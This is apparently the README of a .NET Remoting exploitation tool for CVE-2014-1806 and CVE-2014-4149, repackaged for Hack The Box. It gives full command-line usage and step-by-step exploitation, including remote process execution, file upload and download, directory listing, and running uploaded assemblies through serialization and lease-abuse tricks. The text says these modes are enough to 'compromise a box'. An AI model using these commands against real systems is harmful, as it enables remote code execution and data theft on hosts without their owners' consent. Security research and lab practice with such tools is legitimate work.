ExploitRemotingService (c) 2014 James Forshaw |  Complied Exe For HTB
=============================================

A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149.
It only works on Windows although some aspects _might_ work in Mono on *nix.

NOTE: The vulnerable service provided in this repo has intentionally disabled the 
security fix so that you can test the tools are working. This shouldn't be a common
configuration.

Usage Instructions:
===================

<pre>
ExploitRemotingService [options] uri command [command args]
Copyright (c) James Forshaw 2014

Uri:
The supported URI are as follows:
tcp://host:port/ObjName   - TCP connection on host and portname
ipc://channel/ObjName     - Named pipe channel

Options:

  -s, --secure               Enable secure mode
  -p, --port=VALUE           Specify the local TCP port to listen on
  -i, --ipc=VALUE            Specify listening pipe name for IPC channel
      --user=VALUE           Specify username for secure mode
      --pass=VALUE           Specify password for secure mode
      --ver=VALUE            Specify version number for remote, 2 or 4
      --usecom               Use DCOM backchannel instead of .NET remoting
      --remname=VALUE        Specify the remote object name to register
  -v, --verbose              Enable verbose debug output
      --useser               Uses old serialization tricks, only works on
                               full type filter services
      --uselease             Uses new serialization tricks by abusing lease
                               mechanism.
      --nulluri              Don't send the URI header to the server
      --autodir              When useser is specified try and automatically
                               work out the installdir parameter from the
                               server's current directory.
      --installdir=VALUE     Specify the install directory of the service
                               executable to enable full support with useser
  -h, -?, --help

Commands:
exec [-wait] program [cmdline]: Execute a process on the hosting server
cmd  cmdline                  : Execute a command line process and display stdout
put  localfile remotefile     : Upload a file to the hosting server
get  remotefile localfile     : Download a file from the hosting server
ls   remotedir                : List a remote directory
run  file [args]              : Upload and execute an assembly, calls entry point
user                          : Print the current username
ver                           : Print the OS version
raw base64_object             : Send a raw serialized object to the service
</pre>

This tool supports exploit both TCP remoting services and local IPC services. To test 
the exploit you need to know the name of the .NET remoting service and the port it's
listening on (for TCP) or the name of the Named Pipe (for IPC). You can normally find 
this in the server or client code. Look for things like calls to:

RemotingConfiguration.RegisterWellKnownServiceType or Activator.CreateInstance

You can then try the exploit by constructing an appropriate URL. If TCP you can use the 
URL format tcp://hostname:port/ServiceName. For IPC use ipc://NamedPipeName/ServiceName. 

A simple test is to do:

ExploitRemotingService SERVICEURL ver

If successful it should print the OS version of the hosting .NET remoting service. If 
you get an exception it might be fixed with CVE-2014-1806. At this point try the COM 
version using:

ExploitRemotingService -usecom SERVICEURL ver

This works best locally but can work remotely if you modify the COM configuration and
disable the firewall you should be able to get it to work. If that still doesn't work
then it might be an up to date server. Instead you can also try the full serialization 
version using.

ExploitRemotingService -useser SERVICEURL ls c:\

For this to work the remoting service must be running with full typefilter mode enabled
(which is some, especially IPC services). It also only works with the commands ls, put
and get. But that should be enough to compromise a box. 

ExploitRemotingService -uselease SERVICEURL ls c:\

This mode bypasses low typefilter mode to get serialization tricks to work. It also only 
works with the commands ls, put and get. But that should be enough to compromise a box. 

ExploitRemotingService -uselease -autodir SERVICEURL exec notepad

The autodir option tries to work out the location of the service and will upload a DLL
to enable full remoting support including exec.
